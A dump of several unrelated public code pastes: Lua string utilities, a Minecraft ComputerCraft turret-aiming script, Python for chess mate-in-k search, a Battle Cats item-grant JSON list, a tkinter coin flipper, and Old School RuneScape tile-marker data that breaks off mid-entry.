        s = s:sub(1, pos - 1)
    end
    return s
end

function string:strip()
    local s = self
    if s == """" then
        return """"
    end

    s = lstrip_whitespace(s)
    s = rstrip_whitespace(s)

    return s
end

function string:strip_prefix(prefix)
    if prefix == nil then
        return lstrip_whitespace(self)
    end

    local s = self
    local len = #s
    local pLen = #prefix
    if len == 0 or pLen == 0 or len < pLen then
        return s
    elseif s == prefix then
        return """"
    elseif s:sub(1, pLen) == prefix then
        return s:sub(pLen + 1)
    end

    return s
end

function string:strip_suffix(suffix)
    if suffix == nil then
        return rstrip_whitespace(self)
    end

    local s = self
    local len = #s
    local sLen = #suffix
    if len == 0 or sLen == 0 or len < sLen then
        return s
    elseif s == suffix then
        return """"
    elseif s:sub(-sLen) == suffix then
        return s:sub(1, len - sLen)
    end

    return s
end"
bhPxyM7S,ComputerCraft Peripheral Utils,djmattyg007,Lua,Saturday 23rd of March 2024 07:13:46 PM CDT,"require(""./lib/string_util"")

function find(pType)
    return { peripheral.find(pType, function(name, thing)
        return name:startswith(pType)
    end) }
end

return { find = find }"
Xb8QrwMQ,hrac na tahu vynuti k-tym tahem mat,max2201111,Python,Saturday 23rd of March 2024 05:58:00 PM CDT,"import chess

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachováváme pouze informace o pozici
    return simplified_fen

def evaluate_position(board):
    if board.is_checkmate():
        return -1000  # Mat protihráči
    elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
        return 0  # Remíza
    else:
        return None  # Hra pokračuje

def update_AR_for_mate_in_k(board, AR, max_k=1000):
    k = 0
    while True:
        k += 1
        changed = False
        for _ in range(2):  # Dvakrát pro každou hodnotu k
            for fen in list(AR.keys()):
                board.set_fen(fen)
                if AR[fen] is not None:
                    continue  # Tato pozice již byla ohodnocena

                evaluations = []
                for move in board.legal_moves:
                    board.push(move)
                    next_fen = simplify_fen_string(board.fen())
                    if next_fen not in AR:
                        AR[next_fen] = evaluate_position(board)  # Přidání nových pozic do AR
                    board.pop()

                    if AR[next_fen] is not None:
                        evaluations.append(AR[next_fen])

                # Výpočet nového hodnocení na základě následovníků
                if evaluations:
                    max_eval = max(evaluations)
                    if max_eval == -1000:
                        AR[fen] = 1000 - k
                        changed = True
                    elif 0 in evaluations:
                        AR[fen] = 0
                        changed = True

            if not changed:
                break  # Konec cyklu, pokud nedošlo k žádné změně

        if k >= max_k or not changed:
            break  # Konec hlavního cyklu, pokud dosáhneme max_k nebo nedošlo k žádné změně

            
def print_draw_positions(AR):
    """"""
    Vytiskne všechny remízové pozice (hodnota 0) zaznamenané v slovníku AR.
    """"""
    print(""Remízové pozice:"")
    for fen, value in AR.items():
        if value == 997:
            print(f""FEN: {fen}, Hodnota: {value}"")
            
            
def main():
    initial_fen = ""8/8/8/8/3Q4/5K2/8/4k3 w - - 0 1""
    board = chess.Board(initial_fen)
    AR = {simplify_fen_string(initial_fen): None}  # Inicializace AR s počáteční pozicí
    
    update_AR_for_mate_in_k(board, AR, max_k=50)  # Aktualizace AR
    print_draw_positions(AR)
    
#     # Výpis aktualizovaných hodnocení
#     for fen, value in AR.items():
#         if value == -999:
#             print(f""FEN: {fen}, Hodnota: {value}"")

    

main()"
p6AyseVh,Turret,Slait12,Lua,Saturday 23rd of March 2024 05:55:09 PM CDT,"-- based on https://gist.github.com/SuperSpaceEye/c33443213605d1bf35f81737c9058dc2#file-ballistic_calculator-lua
-- thanks to authors


local table_insert = table.insert
local rad, sin, cos, log, abs, min, pow = math.rad, math.sin, math.cos, math.log, math.abs, math.min, math.pow
local tu = table.unpack

-- peripherals 
local detector = peripheral.find(""playerDetector"")

local pitchrotate = peripheral.wrap(""right"") -- sequensed gearshifts
local yawrotate = peripheral.wrap(""left"") 

local reader = peripheral.find(""blockReader"") -- cannon pitch and yaw

local assemble = peripheral.wrap(""redstoneIntegrator_0"")
local shoot = peripheral.wrap(""redstoneIntegrator_2"")

local reverseyaw = peripheral.wrap(""redstoneIntegrator_3"")
local reversepitch = peripheral.wrap(""redstoneIntegrator_4"")

local timer = 0

assemble.setOutput(""front"", false)
shoot.setOutput(""front"", false)

local function calculate_yaw(Dx, Dz, direction)
    local yaw
    if Dx ~= 0 then
        yaw = math.atan(Dz/Dx) * 180/math.pi
    else
        yaw = 90
    end

    if Dx >= 0 then
        yaw = yaw + 180
    end

    local dirs = {90, 180, 270, 0}
    return (yaw + dirs[direction]) % 360
end

local function pitchangle2(x1,y1,z1, x2,y2,z2)

    local dx = x2 - x1
    local dy = y2 - y1
    local dz = z2 - z1
    local pitchangle = math.deg(math.asin(dy/math.sqrt((dx*dx)+(dy*dy)+(dz*dz))))
    return pitchangle - 10
end



sleep(1)
assemble.setOutput(""front"", true)




while true do
    local players = detector.getOnlinePlayers()
    local whitelist = {}
    local player = players[1]
    local pos = detector.getPlayerPos(player)

    if pos.x == nil then
        print(""No players detected"")
    else
        local cannonCoord = {100, 59, 100}
        local targetCoord = {pos.x, pos.y, pos.z}

        local directionOfCannon = ""south""
        
        local pitch = pitchangle2(100, 59, 100, pos.x, pos.y, pos.z)
        local yaw = calculate_yaw(cannonCoord[1]-targetCoord[1], cannonCoord[3]-targetCoord[3], 3)
        

        readerdata = reader.getBlockData()
        

        term.clear()
        print(""Player pos:"", pos.x, pos.y, pos.z)
        print("""")
        print(""Target yaw angle:"", yaw)
        print(""Target Pitch angle:"", pitch)
        print("""")
        print(""Cannon yaw:"", readerdata.CannonYaw)
        print(""Cannon pitch:"", readerdata.CannonPitch)
        print("""")
        print("""")
        print(""Pitch diff:"", pitch - readerdata.CannonPitch)

        if (yaw - abs(readerdata.CannonYaw)) > 5 then
            reverseyaw.setOutput(""front"", true)
            shoot.setOutput(""front"", false)
            yawrotate.rotate(1)
        elseif (yaw - abs(readerdata.CannonYaw)) < -5 then
            reverseyaw.setOutput(""front"", false)
            shoot.setOutput(""front"", false)
            yawrotate.rotate(1)

        elseif (pitch - readerdata.CannonPitch) > 0.5 then
            reversepitch.setOutput(""front"", false)
            pitchrotate.rotate(3)
        elseif ((pitch + 10) - readerdata.CannonPitch) < -0.5 then
            reversepitch.setOutput(""front"", true)
            pitchrotate.rotate(3)

        elseif (yaw - abs(readerdata.CannonYaw)) < 10 then
            shoot.setOutput(""front"", true)
            timer = timer + 1
            if timer > 2 then
                shoot.setOutput(""front"", false)
                sleep(0.2)
                timer = 0
            end
        end
    end
end"
NTFdUE0W,TBCMBS,BepisNetherite,JSON,Saturday 23rd of March 2024 05:52:23 PM CDT,"[
    {
        ""title"": ""\nCat food +30000"",
        ""items"": [
            {
                ""itemId"": 22,
                ""itemCategory"": 0,
                ""amount"": 30000,
                ""title"": ""Cat food""
            }
        ]
    },
    {
        ""title"": ""\nReturner Mode"",
        ""items"": [
            {
                ""itemId"": 123,
                ""itemCategory"": 0,
                ""amount"": 1,
                ""title"": ""Returner Mode""
            }
        ]
    },
    {
        ""title"": ""\nXP +20000000"",
        ""items"": [
            {
                ""itemId"": 6,
                ""itemCategory"": 0,
                ""amount"": 20000000,
                ""title"": ""XP""
            }
        ]
    },
    {
        ""title"": ""\nNP +9000"",
        ""items"": [
            {
                ""itemId"": 7,
                ""itemCategory"": 0,
                ""amount"": 9000,
                ""title"": ""NP""
            }
        ]
    },
    {
        ""title"": ""\nCatfruit +10 each"",
        ""items"": [
            {
                ""itemId"": 35,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Purple Catfruit""
            },
            {
                ""itemId"": 36,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Red Catfruit""
            },
            {
                ""itemId"": 37,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Blue Catfruit""
            },
            {
                ""itemId"": 38,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Green Catfruit""
            },
            {
                ""itemId"": 39,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Yellow Catfruit""
            },
            {
                ""itemId"": 40,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Epic Catfruit""
            },
            {
                ""itemId"": 42,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Elder Catfruit""
            }
        ]
    },
    {
        ""title"": ""\nCatfruit seed +10 each"",
        ""items"": [
            {
                ""itemId"": 30,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Purple Catfruit Seed""
            },
            {
                ""itemId"": 31,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Red Catfruit Seed""
            },
            {
                ""itemId"": 32,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Blue Catfruit Seed""
            },
            {
                ""itemId"": 33,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Green Catfruit Seed""
            },
            {
                ""itemId"": 34,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Yellow Catfruit Seed""
            },
            {
                ""itemId"": 41,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Elder Catfruit Seed""
            },
            {
                ""itemId"": 43,
                ""itemCategory"": 0,
                ""amount"": 10,
                ""title"": ""Epic Catfruit Seed""
            }
        ]
    },
    {
        ""title"": ""\nCateye +100 each"",
        ""items"": [
            {
                ""itemId"": 50,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Catseye [Special]""
            },
            {
                ""itemId"": 51,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Catseye [Rare]""
            },
            {
                ""itemId"": 52,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Catseye [Super Rare]""
            },
            {
                ""itemId"": 53,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Catseye [Uber Rare]""
            },
            {
                ""itemId"": 54,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Catseye [Legend Rare]""
            }
        ]
    },
    {
        ""title"": ""\nCatamin +100 each"",
        ""items"": [
            {
                ""itemId"": 55,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Catamin [A]""
            },
            {
                ""itemId"": 56,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Catamin [B]""
            },
            {
                ""itemId"": 57,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Catamin [C]""
            }
        ]
    },
    {
        ""title"": ""\nBuilding materials +100 each"",
        ""items"": [
            {
                ""itemId"": 85,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Bricks""
            },
            {
                ""itemId"": 86,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Feathers""
            },
            {
                ""itemId"": 87,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Coal""
            },
            {
                ""itemId"": 88,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Sprockets""
            },
            {
                ""itemId"": 89,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Gold""
            },
            {
                ""itemId"": 90,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Meteorite""
            },
            {
                ""itemId"": 91,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Beast Bones""
            }
        ]
    },
    {
        ""title"": ""\nEngineers +5(maximum value)"",
        ""items"": [
            {
                ""itemId"": 92,
                ""itemCategory"": 0,
                ""amount"": 5,
                ""title"": ""Engineers""
            }
        ]
    },
    {
        ""title"": ""\nCat Ticket +100"",
        ""items"": [
            {
                ""itemId"": 20,
                ""itemCategory"": 0,
                ""amount"": 100,
                ""title"": ""Cat Ticket""
            }
        ]
    },
    {
        ""title"": ""\nRare Ticket +20"",
        ""items"": [
            {
                ""itemId"": 21,
                ""itemCategory"": 0,
                ""amount"": 20,
                ""title"": ""Rare Ticket""
            }
        ]
    },
    {
        ""title"": ""\nPlatinum Ticket +5"",
        ""items"": [
            {
                ""itemId"": 29,
                ""itemCategory"": 0,
                ""amount"": 5,
                ""title"": ""Platinum Ticket""
            }
        ]
    },
    {
        ""title"": ""\nLegend Ticket +4"",
        ""items"": [
            {
                ""itemId"": 145,
                ""itemCategory"": 0,
                ""amount"": 4,
                ""title"": ""Legend Ticket""
            }
        ]
    },
    {
        ""title"": ""\nMedals"",
        ""items"": [
            {
                ""itemId"": 174,
                ""itemCategory"": 0,
                ""amount"": 174
            },
            {
                ""itemId"": 175,
                ""itemCategory"": 0,
                ""amount"": 175
            },
            {
                ""itemId"": 176,
                ""itemCategory"": 0,
                ""amount"": 176
            },
            {
                ""itemId"": 177,
                ""itemCategory"": 0,
                ""amount"": 177
            }
        ]
    },
    {
        ""title"": ""\nUnlock all Legendary Cat Units"",
        ""items"": [
            {
                ""itemId"": 448,
                ""itemCategory"": 1,
                ""amount"": 1,
                ""title"": ""Musashi Miyamoto""
            },
            {
                ""itemId"": 449,
                ""itemCategory"": 1,
                ""amount"": 1,
                ""title"": ""Headmistress Jeanne""
            },
            {
                ""itemId"": 450,
                ""itemCategory"": 1,
                ""amount"": 1,
                ""title"": ""High Lord Babel""
            },
            {
                ""itemId"": 451,
                ""itemCategory"": 1,
                ""amount"": 1,
                ""title"": ""Ushiwakamaru""
            },
            {
                ""itemId"": 455,
                ""itemCategory"": 1,
                ""amount"": 1,
                ""title"": ""Wonder MOMOCO""
            },
            {
                ""itemId"": 461,
                ""itemCategory"": 1,
                ""amount"": 1,
                ""title"": ""Legeluga""
            },
            {
                ""itemId"": 463,
                ""itemCategory"": 1,
                ""amount"": 1,
                ""title"": ""Mighty Kristul Muu""
            },
            {
                ""itemId"": 478,
                ""itemCategory"": 1,
                ""amount"": 1,
                ""title"": ""Lumina""
            },
            {
                ""itemId"": 493,
                ""itemCategory"": 1,
                ""amount"": 1,
                ""title"": ""Gaia the Creator""
            },
            {
                ""itemId"": 510,
                ""itemCategory"": 1,
                ""amount"": 1,
                ""title"": ""Akuma""
            }
        ]
    }
]"
gx9MGTP3,Flip a Coin,ArafatGS,Python,Saturday 23rd of March 2024 05:41:53 PM CDT,"import tkinter as tk
import random

def flip_coin():
    outcomes = [""Heads"", ""Tails""]
    result = random.choice(outcomes)
    result_label.config(text=result)

# Create the main window
root = tk.Tk()
root.title(""Coin Flipper"")

# Create widgets
header_label = tk.Label(root, text=""Welcome to Coin Flipper"", font=(""Helvetica"", 16))
header_label.pack(pady=10)

flip_button = tk.Button(root, text=""Flip Coin"", command=flip_coin, font=(""Helvetica"", 14))
flip_button.pack(pady=10)

result_label = tk.Label(root, text="""", font=(""Helvetica"", 14, ""bold""))
result_label.pack(pady=10)

# Start the GUI event loop
root.mainloop()"
mWiANTEN,Old School RuneScape - Razor-backed kebbits - Tracking tiles,yo_ri_oh,JSON,Saturday 23rd of March 2024 05:40:45 PM CDT,"[{""regionId"":9272,""regionX"":41,""regionY"":23,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":41,""regionY"":22,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":42,""regionY"":22,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":43,""regionY"":22,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":44,""regionY"":22,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":45,""regionY"":22,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":45,""regionY"":23,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":46,""regionY"":23,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":23,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":48,""regionY"":23,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":49,""regionY"":23,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":49,""regionY"":24,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":49,""regionY"":25,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":49,""regionY"":26,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":48,""regionY"":26,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":48,""regionY"":27,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":27,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":28,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":46,""regionY"":28,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":45,""regionY"":27,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":45,""regionY"":28,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":44,""regionY"":27,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":43,""regionY"":27,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":43,""regionY"":28,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":42,""regionY"":28,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":41,""regionY"":28,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":40,""regionY"":27,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":40,""regionY"":25,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":40,""regionY"":26,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":40,""regionY"":24,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":40,""regionY"":23,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":41,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":41,""regionY"":19,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":41,""regionY"":18,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":44,""regionY"":17,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":41,""regionY"":17,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":43,""regionY"":17,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":42,""regionY"":17,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":44,""regionY"":16,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":44,""regionY"":15,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":45,""regionY"":15,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":46,""regionY"":15,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":15,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":14,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":13,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":12,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":10,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":11,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":48,""regionY"":10,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":49,""regionY"":10,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":10,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":51,""regionY"":10,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":10,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":10,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":54,""regionY"":10,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":56,""regionY"":12,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":12,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":54,""regionY"":11,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":54,""regionY"":12,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":12,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":13,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":14,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":15,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":17,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":16,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":56,""regionY"":17,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":56,""regionY"":16,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":16,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":54,""regionY"":16,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":16,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":51,""regionY"":16,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":14,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":11,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":12,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":13,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":15,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":16,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":18,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":49,""regionY"":18,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":48,""regionY"":18,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":18,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":46,""regionY"":19,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":19,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":46,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":46,""regionY"":21,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":44,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":43,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":42,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":44,""regionY"":21,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":45,""regionY"":21,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":26,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":51,""regionY"":26,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":26,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":25,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":21,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":22,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":23,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":24,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":22,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":54,""regionY"":22,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":22,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":23,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":24,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":25,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":26,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":54,""regionY"":26,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":54,""regionY"":27,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":28,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":56,""regionY"":28,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":28,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":27,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":25,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":26,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":58,""regionY"":25,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":59,""regionY"":25,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":59,""regionY"":24,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":59,""regionY"":23,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":59,""regionY"":22,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":60,""regionY"":22,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":60,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":60,""regionY"":21,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":59,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":58,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":58,""regionY"":19,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":18,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":19,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":54,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":20,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":17,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":54,""regionY"":28,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":58,""regionY"":34,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":58,""regionY"":33,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":58,""regionY"":32,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":32,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":31,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":30,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":29,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":56,""regionY"":32,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":32,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":33,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":34,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":35,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":54,""regionY"":35,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":35,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":34,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":33,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":32,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":16,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":42,""regionY"":29,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":42,""regionY"":30,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":42,""regionY"":31,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":42,""regionY"":32,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":42,""regionY"":33,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":43,""regionY"":33,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":43,""regionY"":34,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":44,""regionY"":34,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":46,""regionY"":34,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":45,""regionY"":34,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":46,""regionY"":35,""z"":0,""color"":""#01FFFFFF""},{""re